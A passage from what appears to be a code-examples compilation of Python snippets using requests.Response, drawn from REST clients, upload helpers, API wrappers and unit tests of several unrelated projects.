                # specific object; we forced it unbound, so we have to
                # call it with 'self'
                r = getattr(self, fname)(self, *targets)
            else:
                # This was added from the @target() decorator, binding
                # to a class, it doesn't need a self as Python will
                # add it for us, current self.
                r = getattr(self, fname)(*targets)
        else:	# static/classmethod
            r = fn(*targets)

        # Now, let's see what did it return
        if isinstance(r, result_c):
            return r
        elif r == None or r == True:
            return result_c(1, 0, 0, 0, 0)
        elif r == False:
            return result_c(0, 1, 0, 0, 0)
        else:
            raise blocked_e(
                "%s.%s(): don't know what to do with "
                "return value of type %s; return nothing or "
                "True for success, False for failure, raise "
                "any exception for blockage, or "
                "tcfl.{passed|blocked|error|failed|skip}_e "
                % (type(self).__name__, fn.__name__,
                   type(r).__name)) 
**************************************
def _methods_run(self, do_serially, serial_list, parallel_list):
        """
        Implement the guts of _methods_call()

        Runs and aggregates results of serial methods, then launches a
        threadpool for the parallel methods; aggregates their results
        and raise exception if any happened.

        :returns result_c: aggregated result of all the methods.
        """
        result = result_c(0, 0, 0, 0, 0)
        if do_serially:
            for fname, fn, _type, args in sorted(serial_list + parallel_list):
                retval = self._method_run(fname, fn, _type, args)
                result += retval
                if retval.errors or retval.failed \
                   or retval.blocked or retval.skipped:
                    return result
        else:
            for fname, fn, _type, args in serial_list:
                retval = self._method_run(fname, fn, _type, args)
                result += retval
                if retval.errors or retval.failed \
                   or retval.blocked or retval.skipped:
                    return result
            # FIXME: set from from config
            # All these are supposedly I/O bound jobs as either they
            # are chitchatting with the network or spawning jobs to do
            # stuff
            thread_pool = _multiprocessing_method_pool_c(processes = 10)
            threads = {}
            for fname, fn, _type, args in parallel_list:
                targets = self._mk_target_args_for_fn(fn, args)
                threads[fname] = thread_pool.apply_async(
                    self.__method_trampoline_thread,
                    (msgid_c(l = 2), fname, fn, _type, targets,
                     dict(expecter_parent = self.tls.expecter)))
                # so we can Ctrl-C right away--the system is designed
                # to cleanup top bottom, with everything being
                # expendable
                threads[fname].daemon = True
            thread_pool.close()
            thread_pool.join()
            for thread in threads.values():
                r = thread.get()
                if r[1] != None:	# re-raise thrown exceptions
                    raise r[1][0], r[1][1], r[1][2]
                result += r[0]
            del thread_pool
        return result 
**************************************
def __method_trampoline_call(self, fname, fn, _type, targets):
        # runs a class function and return a return_c
        #
        # convers the return value to return_c from bool, or None, or
        # passes a return_c. Passes exceptions.
        #
        # We use fname instead of fn.__name__ because if we have made
        # an alias out of the method in the class (with setattr(), we
        # want to see the alias name, not the original function name).
        if fname == fn.__name__:
            self.report_info("running %s.%s()"
                             % (type(self).__name__, fn.__name__),
                             dlevel = 3)
        else:
            self.report_info("running %s.%s() [App builder's alias for "
                             "%s() which calls tc_c._*_50_for_target()]"
                             % (type(self).__name__, fname, fn.__name__),
                             dlevel = 3)
        if type(fn) == types.MethodType:	# instance needed
            if fn.im_self == None:
                # This was added from target_wanted_add(), binding to an
                # specific object; we forced it unbound, so we have to
                # call it with 'self'
                r = getattr(self, fname)(self, *targets)
            else:
                # This was added from the @target() decorator, binding
                # to a class, it doesn't need a self as Python will
                # add it for us, current self.
                r = getattr(self, fname)(*targets)
        else:	# static/classmethod
            r = fn(*targets)

        # Now, let's see what did it return
        if isinstance(r, result_c):
            return r
        elif r == None or r == True:
            return result_c(1, 0, 0, 0, 0)
        elif r == False:
            return result_c(0, 1, 0, 0, 0)
        else:
            raise blocked_e(
                "%s.%s(): don't know what to do with "
                "return value of type %s; return nothing or "
                "True for success, False for failure, raise "
                "any exception for blockage, or "
                "tcfl.{passed|blocked|error|failed|skip}_e "
                % (type(self).__name__, fn.__name__,
                   type(r).__name)) 
**************************************
def _methods_run(self, do_serially, serial_list, parallel_list):
        """
        Implement the guts of _methods_call()

        Runs and aggregates results of serial methods, then launches a
        threadpool for the parallel methods; aggregates their results
        and raise exception if any happened.

        :returns result_c: aggregated result of all the methods.
        """
        result = result_c(0, 0, 0, 0, 0)
        if do_serially:
            for fname, fn, _type, args in sorted(serial_list + parallel_list):
                retval = self._method_run(fname, fn, _type, args)
                result += retval
                if retval.errors or retval.failed \
                   or retval.blocked or retval.skipped:
                    return result
        else:
            for fname, fn, _type, args in serial_list:
                retval = self._method_run(fname, fn, _type, args)
                result += retval
                if retval.errors or retval.failed \
                   or retval.blocked or retval.skipped:
                    return result
            # FIXME: set from from config
            # All these are supposedly I/O bound jobs as either they
            # are chitchatting with the network or spawning jobs to do
            # stuff
            thread_pool = _multiprocessing_method_pool_c(processes = 10)
            threads = {}
            for fname, fn, _type, args in parallel_list:
                targets = self._mk_target_args_for_fn(fn, args)
                threads[fname] = thread_pool.apply_async(
                    self.__method_trampoline_thread,
                    (msgid_c(l = 2), fname, fn, _type, targets,
                     dict(expecter_parent = self.tls.expecter)))
                # so we can Ctrl-C right away--the system is designed
                # to cleanup top bottom, with everything being
                # expendable
                threads[fname].daemon = True
            thread_pool.close()
            thread_pool.join()
            for thread in threads.values():
                r = thread.get()
                if r[1] != None:	# re-raise thrown exceptions
                    raise r[1][0], r[1][1], r[1][2]
                result += r[0]
            del thread_pool
        return result 
**************************************
def execute_request_url(self, http_method, url, data=None, params=None,
        headers=None):

        data_format = self.data_format

        if params:
            params = self._sanitize_params(params)

        if data:
            data = json.dumps(data)

        if data and not headers:
            if data_format == 'json':
                headers = {'content-type': 'application/json'}
            else:
                raise RestfulClientError("Unknown data format: " + data_format)

        # requests method based on the supplied http method name.
        # it *should* be a 1 to 1 lc mapping. (GET==get, PUT==put, etc.)
        requests_method_name = http_method.lower()

        # see if the requests api has a method that matches
        try:
            requests_method = getattr(requests, requests_method_name)
        except AttributeError:
            raise RestfulClientError(
                "Unknown method for requests: " + str(requests_method_name))

        # execute the request
        response = self._try_request(requests_method, url, params=params,
            data=data, headers=headers)

        # raise a custom exception if 400/500 error
        try:
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            raise RestfulClientError(e.response.text)

        # deserialize the returned data. may want to flesh this out at some
        # point to allow for additional data formats
        if data_format == 'json':
            # json.loads(response.content) results in unicode instead of
            # str. using yaml results in string values. so using that for now.
            return yaml.load(response.content)
        else:
            raise RestfulClientError("Unknown data format: " + data_format)

    # -------------------------------------------------------------------------
    # Private class methods:
    # ------------------------------------------------------------------------- 

Python requests.Response() Examples

**************************************
def get(self, route, query=None, timeout=None):
        """
        Send a GET request to Promenade.

        :param string route: The URL string following the hostname and API prefix
        :param dict query: A dict of k, v pairs to add to the query string
        :param timeout: A single or tuple value for connect, read timeout.
            A single value indicates the read timeout only
        :return: A requests.Response object
        """
        auth_refresh = False
        while True:
            url = self.base_url + route
            self.logger.debug('GET ' + url)
            self.logger.debug('Query Params: ' + str(query))
            resp = self.__session.get(
                url, params=query, timeout=self._timeout(timeout))

            if resp.status_code == 401 and not auth_refresh:
                self.set_auth()
                auth_refresh = True
            else:
                break

        return resp 
**************************************
def get(self, endpoint, query=None, timeout=None):
        """
        Send a GET request to Drydock.

        :param string endpoint: The URL string following the hostname and API prefix
        :param dict query: A dict of k, v pairs to add to the query string
        :param timeout: A single or tuple value for connect, read timeout.
            A single value indicates the read timeout only
        :return: A requests.Response object
        """
        auth_refresh = False
        while True:
            url = self.base_url + endpoint
            self.logger.debug('GET ' + url)
            self.logger.debug('Query Params: ' + str(query))
            resp = self.__session.get(
                url, params=query, timeout=self._timeout(timeout))

            if resp.status_code == 401 and not auth_refresh:
                self.set_auth()
                auth_refresh = True
            else:
                break

        return resp 
**************************************
def process_protein_info_to_model(response: Response):
    """Process description.

    :param response: response from KEGG API
    :type: dict
    :return: protein model attributes
    """
    # Get protein description from KEGG API
    description = parse_description(response)
    # Filters out db link columns
    protein_as_dict = get_description_properties(
        description=description,
        description_property=DBLINKS,
        columns=PROTEIN_RESOURCES
    )
    # Adapt the dict keys to match protein model columns
    return kegg_properties_to_models(protein_as_dict) 
**************************************
def transmit(self, transport, data, content_type):
        """Transmit the resource to be uploaded.

        Args:
            transport (~requests.Session): A ``requests`` object which can
                make authenticated requests.
            data (bytes): The resource content to be uploaded.
            content_type (str): The content type of the resource, e.g. a JPEG
                image has content type ``image/jpeg``.

        Returns:
            ~requests.Response: The HTTP response returned by ``transport``.
        """
        method, url, payload, headers = self._prepare_request(data, content_type)
        response = _helpers.http_request(
            transport,
            method,
            url,
            data=payload,
            headers=headers,
            retry_strategy=self._retry_strategy,
        )
        self._process_response(response)
        return response 
**************************************
def send_message(self, text: str, retry_count: int = 3) -> Response:
        """Send raw text to bot framework using direct line api"""

        url = "/".join(
            [self._base_url, "conversations", self._conversation_id, "activities"]
        )
        json_payload = {
            "conversationId": self._conversation_id,
            "type": "message",
            "from": {"id": "user1"},
            "text": text,
        }

        success = False
        current_retry = 0
        bot_response = None
        while not success and current_retry < retry_count:
            bot_response = requests.post(url, headers=self._headers, json=json_payload)
            current_retry += 1
            if bot_response.status_code == 200:
                success = True

        return bot_response 
**************************************
def validar_reposta(resposta: requests.Response) -> dict:
    """
    Valida a resposta da API do Lomadee e retorna os dados

    :param resposta: Reposta a ser validada
    :type resposta: requests.Response

    :raises Exception: Falha na requisição

    :return: Dados da Resposta
    :rtype: dict
    """
    if resposta.status_code == 200:
        return resposta.json()
    else:
        return erro(resposta) 
**************************************
def erro(resposta: requests.Response):
    """
    Gera uma exceção padronizada

    :param resposta: Resposta
    :type resposta: requests.Response

    :raises Exception: Falha na requisição
    """
    dados = {
        "codigo": resposta.status_code,
        "motivo": resposta.reason,
        "resposta": None
    }
    try:
        dados["resposta"] = resposta.json()
    except JSONDecodeError:
        pass

    if dados["codigo"] == 404:
        raise RespostaVaziaException()
    else:
        raise Exception(dados) 
**************************************
def process_response(wrapped, instance, args, kwargs):
    """
    Decorator to process requests.Response

    Raises:
        Exception: Service Unavailable

    Returns:
        dict: json data
    """

    try:
        resp = wrapped(*args, **kwargs)

    except (requests.ConnectionError, requests.Timeout) as e:
        raise Exception("Service Unavailable") from e

    else:
        resp.raise_for_status()
        return resp.json() 
**************************************
def call_dbot_api(self, dbot_address: str, uri: str, method: str, **requests_kwargs) -> Response:
        """Send the API's HTTP request

        Channel will be auto created if no channel or be topuped if
        insufficient balance in channel.
        The deposit value is determined by `deposit_strategy`.
        A signature of balance will be sent to DBot server to pay the price of the API.

        :param dbot_address: address of the DBot contract
        :param uri: uri of the endpoint
        :param method: method of the endpoint
        :param requests_kwargs: the other args for http request is same with `requests`
        :return: :class:`Response <Response>` object, http response of the API
        :rtype: requests.Response
        """
        dbot_address = Web3.toChecksumAddress(dbot_address)
        price = self.get_price(dbot_address, uri, method)
        channel = self._get_suitable_channel(dbot_address, price)
        channel.create_transfer(price)
        domain = self.get_dbot_domain(dbot_address)
        dbot_url = domain if domain.lower().startswith('http') else 'http://{}'.format(domain)
        url = '{}/call/{}/{}'.format(dbot_url, dbot_address, remove_slash_prefix(uri))
        return self._request(channel, method, url, **requests_kwargs) 
**************************************
def setup(mocker):
    class Setup:
        resp = mocker.patch.object(requests.Response, '__init__')
        resp.status_code = 200
        resp.json = lambda: {'meta': {'error_type': 'CustomError',
                                      'error_detail': 'custom error detail'}}
        req_get = mocker.patch('requests.get')
        req_get.return_value = resp

        req_post = mocker.patch('requests.post')
        req_post.return_value = resp

        req_delete = mocker.patch('requests.delete')
        req_delete.return_value = resp

        client = KieferClient('access_token')
        headers = {'Authorization': 'Bearer access_token'}
    return Setup 
**************************************
def __init__(self, status_code, content=None, headers=None):
        """A requests.Response that can be used as a mock return_value.

        A key feature is that the instance will evaluate to True or False like
        a real Response, based on the status_code.

        Properties like ok, status_code, text, and content, and methods like
        json(), work as expected based on the inputs.

        :param status_code: Integer HTTP response code (200, 404, etc.)
        :param content: String supplying the payload content of the response.
                        Using a json-encoded string will make the json() method
                        behave as expected.
        :param headers: Dict of HTTP header values to set.
        """
        super(FakeResponse, self).__init__()
        self.status_code = status_code
        if content:
            self._content = content.encode('utf-8')
            self.encoding = 'utf-8'
        if headers:
            self.headers = headers 
**************************************
def post_stats(request: WSGIRequest, response: HttpResponse, data: dict) -> Response:
    es_url_template = get_request_es_url_template(request)
    if not es_url_template:
        return None
    payload = build_payload(data, request, response)
    es_url = es_url_template.format_map(
        dict(payload, ymd=datetime.utcnow().strftime('%Y-%m-%d')),
    )
    body = force_bytes(json.dumps(payload, cls=PayloadJSONEncoder))
    try:
        resp = sess.post(
            es_url, data=body, headers={'Content-Type': 'application/json'}, timeout=0.5
        )
        if resp.status_code != 201:
            log.warning(
                'Unable to post data to %s (error %s): %s',
                es_url,
                resp.status_code,
                resp.text,
            )
        return resp
    except Exception as e:
        log.warning('Unable to post data to %s: %s', es_url, e) 
**************************************
def get_raw(self, url: str, _attempt=1) -> requests.Response:
        """Downloads a file anonymously.

        :raises QueryReturnedNotFoundException: When the server responds with a 404.
        :raises QueryReturnedForbiddenException: When the server responds with a 403.
        :raises ConnectionException: When download failed.

        .. versionadded:: 4.2.1"""
        with self.get_anonymous_session() as anonymous_session:
            resp = anonymous_session.get(url, stream=True)
        if resp.status_code == 200:
            resp.raw.decode_content = True
            return resp
        else:
            if resp.status_code == 403:
                # suspected invalid URL signature
                raise QueryReturnedForbiddenException("403 when accessing {}.".format(url))
            if resp.status_code == 404:
                # 404 not worth retrying.
                raise QueryReturnedNotFoundException("404 when accessing {}.".format(url))
            raise ConnectionException("HTTP error code {}.".format(resp.status_code)) 
**************************************
def test_get_document_types(self, mock_requests):
        mock_response_json = {
            "DE": [
                "DrivingLicence",
                "IdentityCard",
                "Passport",
                "ResidencePermit"
            ]
        }
        response_obj = Response()
        response_obj.__setattr__("status_code", 200)
        response_obj.__setattr__("_content", json.dumps(
            mock_response_json).encode("utf-8"))
        mock_requests.return_value = response_obj

        country_code = "DE"

        reponse = VerificationService().get_document_types(country_code)

        assert(reponse == {
               "DE": ["DrivingLicence", "IdentityCard", "Passport", "ResidencePermit"]
               }) 
**************************************
def test_that_next_value_is_returned_on_no_error(self, request):
        """
        Test that a value from request is returned when no error is
        raised.
        """
        result = None

        def on_next(value):
            nonlocal result
            result = value

        response = requests.Response()
        response.status_code = 200
        request.return_value = response
        r = rx_request('get', 'url')

        r.subscribe(on_next=on_next)

        self.assertEqual(response, result) 
**************************************
def test_that_completed_is_invoked_on_no_error(self, request):
        """
        Test that completed callback is invoked on no error.
        """
        completed = False

        def on_completed():
            nonlocal completed
            completed = True

        response = requests.Response()
        response.status_code = 200
        request.return_value = response
        r = rx_request('get', 'url')

        r.subscribe(on_completed=on_completed)

        self.assertTrue(completed) 
**************************************
def test_that_error_callback_is_not_invoked_on_no_error(self, request):
        """
        Test that error callback is not invoked on no error.
        """
        error = False

        def on_error(_):
            nonlocal error
            error = True

        response = requests.Response()
        response.status_code = 200
        request.return_value = response
        r = rx_request('get', 'url')

        r.subscribe(on_error=on_error)

        self.assertFalse(error) 
**************************************
def request(session, method, url, **kwargs):
    """
    :desc: Custom wrapper method to add a timeout message
           when there is a `requests.exceptions.ConnectionError`
           or `requests.ReadTimeout` exception.
    :param: `session` requests.Session object
            `method` HTTP method to use
            `url` name of the URL
    :return: requests.Response object.
    """

    try:
        return session.request(method=method, url=url, timeout=(5, 5), **kwargs)
    except (ConnectionError, ReadTimeout):
        print(INTERNET_DOWN_MSG)
        sys.exit(1) 
**************************************
def print_response(data_type='text', code=200, data=None, extra=None, pager=False, inverse=False):
    """
    :desc: Prints response to user.
    :param: `data_type` Type of data
            `data` Data to print
            `extra` Extra messages to print
            `code` Response code
    """

    color = None

    if code == 503:
        data = SERVER_DOWN_MSG
        color = 'FAIL'
    elif code == 404 or code == 400:
        color = 'WARNING'
    elif code == 401:
        color = 'FAIL'
        data = UNAUTHORIZED_MSG

    print_response_util(data, extra, data_type, color, is_pager=pager, inverse=inverse) 
**************************************
def put(self, endpoint, query=None, body=None, data=None, timeout=None):
        """
        Send a PUT request to Promenade. If both body and data are specified,
        body will be used.

        :param string endpoint: The URL string following the hostname and API prefix
        :param dict query: A dict of k, v parameters to add to the query string
        :param string body: A string to use as the request body. Will be treated as raw
        :param data: Something json.dumps(s) can serialize. Result will be used as the request body
        :param timeout: A single or tuple value for connect, read timeout.
            A single value indicates the read timeout only
        :return: A requests.Response object
        """
        auth_refresh = False
        url = self.base_url + endpoint
        while True:
            self.logger.debug('PUT ' + url)
            self.logger.debug('Query Params: ' + str(query))
            if body is not None:
                self.logger.debug(
                    "Sending PUT with explicit body: \n%s" % body)
                resp = self.__session.put(
                    self.base_url + endpoint,
                    params=query,
                    data=body,
                    timeout=self._timeout(timeout))
            else:
                self.logger.debug(
                    "Sending PUT with JSON body: \n%s" % str(data))
                resp = self.__session.put(
                    self.base_url + endpoint,
                    params=query,
                    json=data,
                    timeout=self._timeout(timeout))
            if resp.status_code == 401 and not auth_refresh:
                self.set_auth()
                auth_refresh = True
            else:
                break

        return resp 
**************************************
def post(self, endpoint, query=None, body=None, data=None, timeout=None):
        """
        Send a POST request to Drydock. If both body and data are specified,
        body will be used.

        :param string endpoint: The URL string following the hostname and API prefix
        :param dict query: A dict of k, v parameters to add to the query string
        :param string body: A string to use as the request body. Will be treated as raw
        :param data: Something json.dumps(s) can serialize. Result will be used as the request body
        :param timeout: A single or tuple value for connect, read timeout.
            A single value indicates the read timeout only
        :return: A requests.Response object
        """
        auth_refresh = False
        url = self.base_url + endpoint
        while True:
            self.logger.debug('POST ' + url)
            self.logger.debug('Query Params: ' + str(query))
            if body is not None:
                self.logger.debug(
                    "Sending POST with explicit body: \n%s" % body)
                resp = self.__session.post(
                    self.base_url + endpoint,
                    params=query,
                    data=body,
                    timeout=self._timeout(timeout))
            else:
                self.logger.debug(
                    "Sending POST with JSON body: \n%s" % str(data))
                resp = self.__session.post(
                    self.base_url + endpoint,
                    params=query,
                    json=data,
                    timeout=self._timeout(timeout))
            if resp.status_code == 401 and not auth_refresh:
                self.set_auth()
                auth_refresh = True
            else:
                break

        return resp 
**************************************
def post(self, endpoint, query=None, body=None, data=None, timeout=None):
        """
        Send a POST request to Drydock. If both body and data are specified,
        body will will be used.

        :param string endpoint: The URL string following the hostname and API prefix
        :param dict query: A dict of k, v parameters to add to the query string
        :param string body: A string to use as the request body. Will be treated as raw
        :param data: Something json.dumps(s) can serialize. Result will be used as the request body
        :param timeout: A single or tuple value for connect, read timeout.
            A single value indicates the read timeout only
        :return: A requests.Response object
        """
        auth_refresh = False
        url = self.base_url + endpoint
        while True:
            self.logger.debug('POST ' + url)
            self.logger.debug('Query Params: ' + str(query))
            if body is not None:
                self.logger.debug(
                    "Sending POST with explicit body: \n%s" % body)
                resp = self.__session.post(
                    self.base_url + endpoint,
                    params=query,
                    data=body,
                    timeout=self._timeout(timeout))
            else:
                self.logger.debug(
                    "Sending POST with JSON body: \n%s" % str(data))
                resp = self.__session.post(
                    self.base_url + endpoint,
                    params=query,
                    json=data,
                    timeout=self._timeout(timeout))
            if resp.status_code == 401 and not auth_refresh:
                self.set_auth()
                auth_refresh = True
            else:
                break

        return resp 
**************************************
def remote_response(self):
        """
        远程服务器的响应, 对象, requests.Response
        :rtype: requests.Response
        """
        return self.__getattribute__("_remote_response") 
**************************************
def remote_response(self, value):
        """:type value: requests.Response"""
        self.__setattr__("_remote_response", value) 
**************************************
def test_homepage(self):
        """https://httpbin.org/"""

        self.rv = self.client.get(
            self.url("/"),
            environ_base=env(),
            headers=headers(),
        )  # type: Response
        self.assertIn(b'httpbin', self.rv.data, msg=self.dump()) 
**************************************
def test__enable_keep_alive_per_domain(self):
        """https://httpbin.org/"""
        self.reload_zmirror({"enable_keep_alive_per_domain": True})

        self.rv = self.client.get(
            self.url("/"),
            environ_base=env(),
            headers=headers(),
        )  # type: Response
        self.assertIn(b'httpbin', self.rv.data, msg=self.dump()) 
**************************************
def test_main_domain_as_external(self):
        self.rv = self.client.get(
            self.url("/extdomains//" + self.C.target_domain),
            environ_base=env(),
            headers=headers(),
        )  # type: Response
        self.assertEqual(307, self.rv.status_code, self.dump()) 
**************************************
def test_user_agent(self):
        """https://httpbin.org/user-agent"""

        self.rv = self.client.get(
            self.url("/user-agent"),
            environ_base=env(),
            headers=headers(),
        )  # type: Response

        self.assertEqual(load_rv_json(self.rv)['user-agent'], DEFAULT_USER_AGENT, msg=self.dump()) 
**************************************
def test_remote_set_cookie(self):
        """https://httpbin.org/cookies/set?name=value"""
        self.rv = self.client.get(
            self.url("/cookies/set?k1=value1&k2=value2"),
            environ_base=env(),
            headers=headers(),
        )  # type: Response

        self.assertEqual(2, len(self.rv.headers.get_all("Set-Cookie")), msg=self.dump())
        for set_cookie_header in self.rv.headers.get_all("Set-Cookie"):
            if not ("k1=value1" in set_cookie_header
                    or "k2=value2" in set_cookie_header):
                raise ValueError("cookie set error" + self.dump())
        self.assertEqual(302, self.rv.status_code, msg=self.dump()) 
**************************************
def test_relative_redirect_to(self):
        """https://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F"""
        self.rv = self.client.get(
            self.url("/redirect-to"),
            query_string="url=http%3A%2F%2Fexample.com%2F",
            environ_base=env(),
            headers=headers(),
        )  # type: Response

        self.assertIn("example.com", self.rv.location, msg=self.dump()) 
**************************************
def test_relative_redirect_to_2(self):
        """https://httpbin.org/redirect-to?url=http%3A%2F%2Fexample.com%2F"""
        self.rv = self.client.get(
            self.url("/redirect-to"),
            query_string="url=http%3A%2F%2Feu.httpbin.org%2F",
            environ_base=env(),
            headers=headers(),
        )  # type: Response
        self.assertEqual(self.url("/extdomains/eu.httpbin.org/"), self.rv.location, msg=self.dump()) 
**************************************
def get(self, endpoint=None, data=None, headers=None):
        """
        *Helper.* Calls :any:`request` with `method='GET'`

        :param endpoint: See :any:`request`.
        :param data: See :any:`request`.
        :param headers: See :any:`request`.
        :return: (:obj:`dict`) Response.
        """

        return self.request('GET', endpoint=endpoint, data=data, headers=headers) 
**************************************
def post(self, endpoint=None, data=None, headers=None):
        """
        *Helper.* Calls :any:`request` with `method='POST'`

        :param endpoint: See :any:`request`.
        :param data: See :any:`request`.
        :param headers: See :any:`request`.
        :return: (:obj:`dict`) Response.
        """

        return self.request('POST', endpoint=endpoint, data=data, headers=headers) 
**************************************
def put(self, endpoint=None, data=None, headers=None):
        """
        *Helper.* Calls :any:`request` with `method='PUT'`

        :param endpoint: See :any:`request`.
        :param data: See :any:`request`.
        :param headers: See :any:`request`.
        :return: (:obj:`dict`) Response.
        """

        return self.request('PUT', endpoint=endpoint, data=data, headers=headers) 
**************************************
def delete(self, endpoint=None, data=None, headers=None):
        """
        *Helper.* Calls :any:`request` with `method='DELETE'`

        :param endpoint: See :any:`request`.
        :param data: See :any:`request`.
        :param headers: See :any:`request`.
        :return: (:obj:`dict`) Response.
        """

        return self.request('DELETE', endpoint=endpoint, data=data, headers=headers) 
**************************************
def parse_description(response: Response):
    """Parse the several properties in the description file given an KEGG identifier using the KEGG API.

    :rtype: dict
    :return: description dictionary
    """
    description = {}

    for line in response.iter_lines():
        line = line.decode('utf-8')

        if not line.startswith(' '):
            keyword = get_first_word(line)

        if keyword == 'ENTRY':
            description['ENTRY'] = parse_entry_line(line)

        elif keyword == 'NAME':
            entry_name = parse_entry_line(line)
            if entry_name:
                # If there is a name, take the first element of the tuple and strip semi colon
                # in case there are multiple names
                description['ENTRY_NAME'] = entry_name[0].strip(';')

        elif keyword == 'PATHWAY':

            if 'PATHWAY' not in description:
                description['PATHWAY'] = [parse_pathway_line(line)]
            else:
                description['PATHWAY'].append(parse_pathway_line(line))

        elif keyword == 'DBLINKS':

            if 'DBLINKS' not in description:
                description['DBLINKS'] = [parse_link_line(line)]
            else:
                description['DBLINKS'].append(parse_link_line(line))

    return description 
**************************************
def get(self, url, **kwargs):
        """
        :rtype: requests.Response
        """
        if 'timeout' in kwargs:
            kwargs.pop('timeout')
        return self.session.get(url, timeout=(2, 30), **kwargs) 
**************************************
def __call__(self, url, method='GET', body=None, headers=None,
                 timeout=None, **kwargs):
        """Make an HTTP request using requests.

        Args:
            url (str): The URI to be requested.
            method (str): The HTTP method to use for the request. Defaults
                to 'GET'.
            body (bytes): The payload / body in HTTP request.
            headers (Mapping[str, str]): Request headers.
            timeout (Optional[int]): The number of seconds to wait for a
                response from the server. If not specified or if None, the
                requests default timeout will be used.
            kwargs: Additional arguments passed through to the underlying
                requests :meth:`~requests.Session.request` method.

        Returns:
            google.auth.transport.Response: The HTTP response.

        Raises:
            google.auth.exceptions.TransportError: If any exception occurred.
        """
        try:
            _LOGGER.debug('Making request: %s %s', method, url)
            response = self.session.request(
                method, url, data=body, headers=headers, timeout=timeout,
                **kwargs)
            return _Response(response)
        except requests.exceptions.RequestException as caught_exc:
            new_exc = exceptions.TransportError(caught_exc)
            six.raise_from(new_exc, caught_exc) 
**************************************
def transmit(self, transport, data, metadata, content_type):
        """Transmit the resource to be uploaded.

        Args:
            transport (~requests.Session): A ``requests`` object which can
                make authenticated requests.
            data (bytes): The resource content to be uploaded.
            metadata (Mapping[str, str]): The resource metadata, such as an
                ACL list.
            content_type (str): The content type of the resource, e.g. a JPEG
                image has content type ``image/jpeg``.

        Returns:
            ~requests.Response: The HTTP response returned by ``transport``.
        """
        method, url, payload, headers = self._prepare_request(
            data, metadata, content_type
        )
        response = _helpers.http_request(
            transport,
            method,
            url,
            data=payload,
            headers=headers,
            retry_strategy=self._retry_strategy,
        )
        self._process_response(response)
        return response 
**************************************
def recover(self, transport):
        """Recover from a failure.

        This method should be used when a :class:`ResumableUpload` is in an
        :attr:`~ResumableUpload.invalid` state due to a request failure.

        This will verify the progress with the server and make sure the
        current upload is in a valid state before :meth:`transmit_next_chunk`
        can be used again.

        Args:
            transport (~requests.Session): A ``requests`` object which can
                make authenticated requests.

        Returns:
            ~requests.Response: The HTTP response returned by ``transport``.
        """
        method, url, payload, headers = self._prepare_recover_request()
        # NOTE: We assume "payload is None" but pass it along anyway.
        response = _helpers.http_request(
            transport,
            method,
            url,
            data=payload,
            headers=headers,
            retry_strategy=self._retry_strategy,
        )
        self._process_recover_response(response)
        return response 
**************************************
def req(self, url, method='get', params=None, data=None, auth=False):
        """
        请求API

        :type url: str
        :param url: API
        
        :type method: str
        :param method: HTTP METHOD
        
        :type params: dict
        :param params: query
        
        :type data: dict
        :param data: body
        
        :type auth: bool
        :param auth: if True and session expired will raise exception
        
        :rtype: requests.Response
        :return: Response
        """
        self.logger.debug('fetch api<%s:%s>' % (method, url))
        if auth and self.user_alias is None:
            raise Exception('cannot fetch api<%s> without session' % url)
        s = requests.Session()
        r = s.request(method, url, params=params, data=data, cookies=self.cookies, headers=self.headers,
                      timeout=self.timeout)
        s.close()
        if r.url is not url and RE_SESSION_EXPIRE.search(r.url) is not None:
            self.expire()
            if auth:
                raise Exception('auth expired, could not fetch with<%s>' % url)
        return r 
**************************************
def print_json(j):
    try:
        if isinstance(j, requests.Response):
            j = j.json()
        s = json.dumps(j, sort_keys=True, indent=4)
        print(s)
    except Exception as e:
        print("could not decode json:", e)
        print(j) 
**************************************
def _format_code_request(
        self, formatter: str, code: t.List[str], options: t.Dict[str, t.Any]
    ) -> requests.Response:
        return self.request(
            verb="POST",
            path="/jupyterlab_code_formatter/format",
            data=json.dumps(
                {"code": code, "options": options, "formatter": formatter,}
            ),
        ) 
**************************************
def get_message(self, retry_count: int = 3) -> Tuple[Response, str]:
        """Get a response message back from the bot framework using direct line api"""

        url = "/".join(
            [self._base_url, "conversations", self._conversation_id, "activities"]
        )
        url = url + "?watermark=" + self._watermark

        success = False
        current_retry = 0
        bot_response = None
        while not success and current_retry < retry_count:
            bot_response = requests.get(
                url,
                headers=self._headers,
                json={"conversationId": self._conversation_id},
            )
            current_retry += 1
            if bot_response.status_code == 200:
                success = True
                json_response = bot_response.json()

                if "watermark" in json_response:
                    self._watermark = json_response["watermark"]

                if "activities" in json_response:
                    activities_count = len(json_response["activities"])
                    if activities_count > 0:
                        return (
                            bot_response,
                            json_response["activities"][activities_count - 1]["text"],
                        )
                    return bot_response, "No new messages"
        return bot_response, "error contacting bot for response" 
**************************************
def __init__(self, message: str, response: Response, payload=None):
        self.message = message
        self.response = response
        self.payload = payload 
**************************************
def _get_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        if requests_data:
            request_url = f"{request_url}&{urlencode(requests_data)}"

        return requests.get(request_url, headers=request_header) 
**************************************
def _post_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        return requests.post(request_url, json=requests_data, headers=request_header) 
**************************************
def _put_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        return requests.put(request_url, json=requests_data, headers=request_header) 
**************************************
def _delete_request(
        request_url: str,
        requests_data: typing.Dict[str, typing.Any],
        request_header: typing.Dict[str, str],
    ) -> requests.Response:
        return requests.delete(request_url, headers=request_header) 
**************************************
def test_get_response(self):
        """This test will test out:
        - BaseAttrDict.response
        """
        tag = '2P0LYQ'
        chests = self.cr.get_player_chests(tag)
        self.assertTrue(isinstance(chests.response, requests.Response)) 
**************************************
def on_cooperative_close_denied(self, dbot_address: str, response: Response = None) -> None:
        """Call back function when no valid closing signature received

        This function will be called when can not get valid closing signature in
        method `close_channel`

        :param dbot_address: address of the DBot contract
        :param response: response from DBot server when request closing signature
        """
        logger.warning('No valid closing signature received from DBot server({}).\n{}'.format(dbot_address, response.text))
        logger.warning('Closing noncooperatively on a balance of 0.')
        # if cooperative close denied, client close the channel with balance 0 unilaterally
        self.uncooperative_close_channel(dbot_address, 0) 
**************************************
def _request(
            self,
            channel: Channel,
            method: str,
            url: str,
            **requests_kwargs
    ) -> Tuple[Union[None, Response], bool]:
        """
        Performs a simple request to the HTTP server with headers representing the given
        channel state.
        """
        headers = Munch()
